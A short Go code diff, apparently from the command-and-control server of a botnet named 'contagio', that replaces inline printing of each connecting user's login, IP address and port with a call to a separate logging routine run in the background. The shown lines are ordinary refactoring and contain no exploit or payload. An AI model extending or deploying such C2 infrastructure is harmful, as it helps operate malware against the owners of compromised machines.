@@ -5,10 +5,8 @@ import (
 	"bytes"
 	"contagio/contagio/cnc/database"
 	"contagio/contagio/cnc/utils"
-	"fmt"
 	random "math/rand"
 	"net/textproto"
-	"strings"
 	"time"
 )
 
@@ -45,15 +43,9 @@ func (c *Connection) Auth() bool {
 	}
 	c.login = login
 
-	if c.config.Logs.NewClientConnected {
-		log := c.config.Logs.NewClientConnectedFormat
-
-		log = strings.ReplaceAll(log, "{date}", time.Now().Format("15:04:05"))
-		log = strings.ReplaceAll(log, "{login}", login)
-		log = strings.ReplaceAll(log, "{ip}", strings.Split(c.conn.RemoteAddr().String(), ":")[0])
-		log = strings.ReplaceAll(log, "{port}", strings.Split(c.conn.RemoteAddr().String(), ":")[1])
-
-		fmt.Println(GeneratePrompt(log))
+	if c.config.Logs.NewClientConnectedLog {
+		l := c.NewLog(USER_CONNECTED, "", "", "", "")
+		go l.SendLog()
 	}
 
 	return true
